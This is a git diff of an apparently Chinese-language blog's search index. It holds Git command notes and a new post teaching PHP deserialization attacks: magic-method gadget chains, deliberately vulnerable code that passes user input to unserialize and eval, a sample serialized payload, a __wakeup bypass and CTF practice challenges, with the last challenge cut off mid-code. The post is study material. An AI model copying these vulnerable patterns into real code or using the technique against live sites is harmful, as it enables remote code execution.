+<p>若想要恢复，即输入 <code>git add delete.txt</code>和<code>git commit -m &quot;备注&quot; delete.txt</code>来确定删除</p>
+<p>记录不可磨灭（除非删除本地库），所以可根据记录找回删除文件</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113009537.png" alt="image-20220110113009537"></p>
+<h1 id="添加到暂存区的删除文件找回"><a href="#添加到暂存区的删除文件找回" class="headerlink" title="添加到暂存区的删除文件找回"></a>添加到暂存区的删除文件找回</h1><p>新建文件，并提交到本地库</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113802079.png" alt="image-20220110113802079"></p>
+<p>然后删除文件，并添加到暂存区</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113841345.png" alt="image-20220110113841345"></p>
+<p>若要找回此文件，则输入指令：<code>git reset --hard HEAD</code>(本质仍然是版本回归)</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110114018441.png" alt="image-20220110114018441"></p>
+<p><strong><u>总结：删除文件找回的前提是，删除前文件存在时的状态提交到了本地库</u></strong></p>
+<h1 id="文件比较"><a href="#文件比较" class="headerlink" title="文件比较"></a>文件比较</h1><p>命令：<code>git diff 文件名.拓展名</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110191213839.png" alt="image-20220110191213839"></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110191331518.png" alt="image-20220110191331518"></p>
+<p>上图表示第一行删去了9个a</p>
+<p>还有其他比较方式，和本地库比较：<code>git diff HEAD 文件名</code>、和历史版本比较：<code>git diff HEAD^ 文件名</code>（和上一版本比较）</p>
+]]></content>
+      <tags>
+        <tag>Git</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Git的分支管理级Git的基本原理</title>
     <url>/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/</url>
     <content><![CDATA[<h1 id="分支的意义"><a href="#分支的意义" class="headerlink" title="分支的意义"></a>分支的意义</h1><ul>
@@ -944,66 +1010,6 @@
 <p>当分支文件不一样时，才会出现分支</p>
 <p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111122101487.png" alt="image-20220111122101487"></p>
 <p><strong>Git在本地的版本控制就完结了</strong></p>
-]]></content>
-      <tags>
-        <tag>Git</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Git版本穿梭及版本比较</title>
-    <url>/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/</url>
-    <content><![CDATA[<h1 id="上节内容命令小结"><a href="#上节内容命令小结" class="headerlink" title="上节内容命令小结"></a>上节内容命令小结</h1><ul>
-<li><p>状态查看：<code>git status</code></p>
-</li>
-<li><p>添加操作：<code>git add 文件名.扩展名</code>（将工作区文件添加到暂存区）</p>
-</li>
-<li><p>提交操作：<code>git commit -m &quot;备注&quot; 文件名.扩展名</code>（将暂存区文件提交到本地库）</p>
-<span id="more"></span></li>
-</ul>
-<h1 id="查看历史记录"><a href="#查看历史记录" class="headerlink" title="查看历史记录"></a>查看历史记录</h1><p>查看历史版本：<code>git log</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094308532.png" alt="image-20220109094308532"></p>
-<p>简洁显示：<code>git log --pretty=oneline</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094600500.png" alt="image-20220109094600500"></p>
-<p>更简洁显示：<code>git log --oneline</code>（只显示后面版本）</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094753040.png" alt="image-20220109094753040"></p>
-<p>显示指针移动步数：<code>git reflog</code>更加详细的历史记录</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109095213452.png" alt="image-20220109095213452"></p>
-<p>HEAD@{移动到当前版本所需要步数}</p>
-<p>若版本信息有多屏</p>
-<p>则空格向下翻页，b向上翻页，q退出</p>
-<h1 id="版本前进后退"><a href="#版本前进后退" class="headerlink" title="版本前进后退"></a>版本前进后退</h1><h2 id="基于索引值操作-推荐"><a href="#基于索引值操作-推荐" class="headerlink" title="基于索引值操作[推荐]"></a>基于索引值操作[推荐]</h2><p>命令：<code>git reset ---hard 开头哈希值（索引值）</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109100709122.png" alt="image-20220109100709122"></p>
-<p>选中了即复制了，直接右键Paste粘贴即可，前进后退都一样</p>
-<h2 id="使用-或-符号"><a href="#使用-或-符号" class="headerlink" title="使用^或~符号"></a>使用^或~符号</h2><p>只能往后退，不能往前</p>
-<p>命令：<code>git reset --hard HEAD^</code>（退一个版本）  <code>git reset --HEAD^^</code>（向后退两个版本）</p>
-<p>有几个”^“就退几个版本，或者<code>git reset --hard HEAD~n</code>后退n步</p>
-<h2 id="soft、mixed、hard参数的区别"><a href="#soft、mixed、hard参数的区别" class="headerlink" title="soft、mixed、hard参数的区别"></a>soft、mixed、hard参数的区别</h2><p>soft参数（不常用）：仅仅移动本地库指针（不改变本地库数据）</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111029305.png" alt="image-20220110111029305"></p>
-<p>mixed参数（不常用）：在本地库移动指针并且重置暂存区</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111040189.png" alt="image-20220110111040189"></p>
-<p>hard参数：在本地库移动指针、重置暂存区、重置工作区</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111056667.png" alt="image-20220110111056667"></p>
-<h1 id="永久删除文件后找回"><a href="#永久删除文件后找回" class="headerlink" title="永久删除文件后找回"></a>永久删除文件后找回</h1><p>创建一个新文件</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111643932.png" alt="image-20220110111643932"></p>
-<p>删除文件指令：<code>rm 文件名.扩展名</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111832475.png" alt="image-20220110111832475"></p>
-<p>现在状态为</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111909833.png" alt="image-20220110111909833"></p>
-<p>若想要恢复，即输入 <code>git add delete.txt</code>和<code>git commit -m &quot;备注&quot; delete.txt</code>来确定删除</p>
-<p>记录不可磨灭（除非删除本地库），所以可根据记录找回删除文件</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113009537.png" alt="image-20220110113009537"></p>
-<h1 id="添加到暂存区的删除文件找回"><a href="#添加到暂存区的删除文件找回" class="headerlink" title="添加到暂存区的删除文件找回"></a>添加到暂存区的删除文件找回</h1><p>新建文件，并提交到本地库</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113802079.png" alt="image-20220110113802079"></p>
-<p>然后删除文件，并添加到暂存区</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113841345.png" alt="image-20220110113841345"></p>
-<p>若要找回此文件，则输入指令：<code>git reset --hard HEAD</code>(本质仍然是版本回归)</p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110114018441.png" alt="image-20220110114018441"></p>
-<p><strong><u>总结：删除文件找回的前提是，删除前文件存在时的状态提交到了本地库</u></strong></p>
-<h1 id="文件比较"><a href="#文件比较" class="headerlink" title="文件比较"></a>文件比较</h1><p>命令：<code>git diff 文件名.拓展名</code></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110191213839.png" alt="image-20220110191213839"></p>
-<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110191331518.png" alt="image-20220110191331518"></p>
-<p>上图表示第一行删去了9个a</p>
-<p>还有其他比较方式，和本地库比较：<code>git diff HEAD 文件名</code>、和历史版本比较：<code>git diff HEAD^ 文件名</code>（和上一版本比较）</p>
 ]]></content>
       <tags>
         <tag>Git</tag>
@@ -1146,6 +1152,151 @@
 ]]></content>
       <tags>
         <tag>PHPstudy</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP中的序列化和反序列化</title>
+    <url>/2022/04/23/PHP%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<h1 id="php序列化和反序列化知识点"><a href="#php序列化和反序列化知识点" class="headerlink" title="php序列化和反序列化知识点"></a>php序列化和反序列化知识点</h1><p>主要作用是把本来不能直接存储的数据转换成可存储的数据，如当你想把内存中的对象状态保存到一个文件中或者数据库中的时候</p>
+<p>$this-&gt;是伪变量，具体用法如下：</p>
+<p>简单来说就是<strong>在一个类中，调用该类中的属性或者方法。</strong></p>
+<span id="more"></span>
+
+<p><img src="/2022/04/23/PHP%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220423095249064.png" alt="image-20220423095249064"></p>
+<p>在php的语句中，有一些系统自带的方法名，均以双下划线开头，它会在特定的情况下被调用。即所谓的魔法函数。他们在面向编程中起着至关重要的作用。</p>
+<p>也就是说这些函数会在特定情况下执行函数里面的语句，如果没有调用此函数，或者调用了却没有内容，相当于没有执行任何东西。</p>
+<p>一些魔术方法（牢记函数发生情况）：</p>
+<table>
+<thead>
+<tr>
+<th>方法名</th>
+<th>调用条件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>__call</td>
+<td>调用不可访问或不存在的方法时被调用</td>
+</tr>
+<tr>
+<td>__callStatic</td>
+<td>调用不可访问或不存在的静态方法时被调用</td>
+</tr>
+<tr>
+<td>__clone</td>
+<td>进行对象clone时被调用，用来调整对象的克隆行为</td>
+</tr>
+<tr>
+<td>__construct</td>
+<td>构建对象的时被调用；</td>
+</tr>
+<tr>
+<td>__debuginfo</td>
+<td>当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本</td>
+</tr>
+<tr>
+<td>__destruct</td>
+<td>明确销毁对象或脚本结束时被调用；</td>
+</tr>
+<tr>
+<td>__get</td>
+<td>读取不可访问或不存在属性时被调用</td>
+</tr>
+<tr>
+<td>__invoke</td>
+<td>当以函数方式调用对象时被调用</td>
+</tr>
+<tr>
+<td>__isset</td>
+<td>对不可访问或不存在的属性调用isset()或empty()时被调用</td>
+</tr>
+<tr>
+<td>__set</td>
+<td>当给不可访问或不存在属性赋值时被调用</td>
+</tr>
+<tr>
+<td>__set_state</td>
+<td>当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。</td>
+</tr>
+<tr>
+<td>__sleep</td>
+<td>当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用</td>
+</tr>
+<tr>
+<td>__toString</td>
+<td>当一个类被转换成字符串时被调用</td>
+</tr>
+<tr>
+<td>__unset</td>
+<td>对不可访问或不存在的属性进行unset时被调用</td>
+</tr>
+<tr>
+<td>__wakeup</td>
+<td>当使用unserialize时被调用，可用于做些对象的初始化操作</td>
+</tr>
+</tbody></table>
+<ul>
+<li>反序列化的常见起点<ul>
+<li><code>__wakeup</code> 一定会调用</li>
+<li><code>__destruct</code> 一定会调用</li>
+<li><code>__toString</code> 当一个对象被反序列化后又被当做字符串使用</li>
+</ul>
+</li>
+<li>反序列化的常见中间跳板:<ul>
+<li><code>__toString</code> 当一个对象被当做字符串使用</li>
+<li><code>__get</code> 读取不可访问或不存在属性时被调用</li>
+<li><code>__set</code> 当给不可访问或不存在属性赋值时被调用</li>
+<li><code>__isset</code> 对不可访问或不存在的属性调用isset()或empty()时被调用。形如 <code>$this-&gt;$func();</code></li>
+</ul>
+</li>
+<li>反序列化的常见终点:<ul>
+<li><code>__call</code> 调用不可访问或不存在的方法时被调用</li>
+<li><code>call_user_func</code> 一般php代码执行都会选择这里</li>
+<li><code>call_user_func_array</code> 一般php代码执行都会选择这里</li>
+</ul>
+</li>
+</ul>
+<p>主要还是三点：</p>
+<ol>
+<li>起点</li>
+<li>跳板</li>
+<li>代码执行</li>
+</ol>
+<p>示例：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr1</span>=<span class="string">&quot;abc&quot;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr2</span>=<span class="string">&quot;123&quot;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">echoP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;varr1.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;__construct&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;__destruct&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="string">&quot;__toString&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;__sleep&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;varr1&#x27;</span>,<span class="string">&#x27;varr2&#x27;</span>);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;__wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> test(); <span class="comment">//实例化对象，调用__construct()方法，输出__construct</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span>-&gt;echoP();  <span class="comment">//调用echoP()方法，输出&quot;abc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>;  <span class="comment">//obj对象被当做字符串输出，调用__toString()方法，输出__toString</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> =serialize(<span class="variable">$obj</span>); <span class="comment">//obj对象被序列化，调用__sleep()方法，输出__sleep</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="variable">$s</span>); <span class="comment">//$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 脚本结束又会调用__destruct()方法，输出__destruct</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果如下</p>
+<p><img src="/2022/04/23/PHP%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220424140829646.png" alt="image-20220424140829646"></p>
+<p><strong>对象注入</strong></p>
+<p>当用户的请求在传给反序列化函数unserialize()之前没有被正确的过滤时就会产生漏洞。因为PHP允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的unserialize函数，最终导致一个在该应用范围内的任意PHP对象注入。</p>
+<p>对象漏洞出现得满足两个前提：</p>
+<p>一、unserialize的参数可控。</p>
+<p>二、 代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。</p>
+<p>例如</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;demo&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$a_unser</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>比如这个列子，直接是用户生成的内容传递给unserialize()函数，那就可以构造这样的语句</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?test=O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;lemon&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在脚本运行结束后便会调用_destruct函数，同时会覆盖test变量输出lemon。</p>
+<p><img src="/2022/04/23/PHP%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220424141411465.png" alt="image-20220424141411465"></p>
+<p>再看一个例子</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;demo&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    @<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test);<span class="comment">//_destruct()函数中调用eval执行序列化对象中的语句</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$len</span> = strlen(<span class="variable">$test</span>)+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pp</span> = <span class="string">&quot;O:1:\&quot;A\&quot;:1:&#123;s:4:\&quot;test\&quot;;s:&quot;</span>.<span class="variable">$len</span>.<span class="string">&quot;:\&quot;&quot;</span>.<span class="variable">$test</span>.<span class="string">&quot;;\&quot;;&#125;&quot;</span>; <span class="comment">// 构造序列化对象</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$test_unser</span> = unserialize(<span class="variable">$pp</span>); <span class="comment">// 反序列化同时触发_destruct函数</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其实仔细观察就会发现，其实我们手动构造序列化对象就是为了unserialize()函数能够触发__destruc()函数，然后执行在__destruc()函数里恶意的语句。</p>
+<p>所以我们利用这个漏洞点便可以获取web shell了</p>
+<p><img src="/2022/04/23/PHP%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220424141833788.png" alt="image-20220424141833788"></p>
+<p><strong>绕过魔法函数的方法</strong></p>
+<p>__wakeup()：当反序列化字符串中，表示属性个数的值大于真实属性个数时，会绕过 wakeup 函数的执行（PHP5&lt;5.6.25    PHP7&lt;7.0.10）</p>
+<p>(以上部分内容摘自<a href="https://www.php.cn/php-weizijiaocheng-454909.html">php中文网</a>，但略有改动)</p>
+<h1 id="php反序列化例题"><a href="#php反序列化例题" class="headerlink" title="php反序列化例题"></a>php反序列化例题</h1><p>例题1：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;v1(<span class="keyword">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;v1-&gt;world();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1-&gt;get_flag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;run();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span>.<span class="keyword">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>例题2：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">My_ClassLoader</span></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 我的类加载器</span></span><br><span class="line"><span class="comment">     * 希望没有什么安全问题....XD</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class_value</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 类创建</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$class_name</span>, <span class="variable">$class_value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class_name = <span class="variable">$class_name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class_value = <span class="variable">$class_value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 通过wakeup检查 反序列化后 类加载的合理性</span></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="keyword">$this</span>-&gt;class_name, [<span class="string">&quot;Person_Bean&quot;</span>, <span class="string">&quot;Person_identify&quot;</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;class_name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 销毁时执行</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;class_name(<span class="keyword">$this</span>-&gt;class_value);</span><br><span class="line">        <span class="variable">$a</span>-&gt;work(); <span class="comment">// 动态加载的类进行工作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Manage_test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>; <span class="comment">// 调用函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func = <span class="variable">$func</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;func;</span><br><span class="line">        <span class="variable">$a</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面这俩还没开发完，其实我也不知道应该再写.....我要实现的功能是啥来着..？</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person_identify</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span> = <span 